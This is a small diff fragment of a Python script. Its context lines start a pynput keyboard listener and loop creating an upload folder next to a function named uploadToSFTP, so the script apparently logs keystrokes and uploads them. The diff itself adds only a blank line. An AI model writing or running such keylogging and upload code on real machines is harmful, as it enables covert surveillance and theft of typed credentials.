@@ -92,6 +92,7 @@ def uploadToSFTP():
 
 listener = keyboard.Listener(on_press=on_press)
 listener.start()
+
 while True:
 	# create temp folder
 	os.mkdir("toupload")
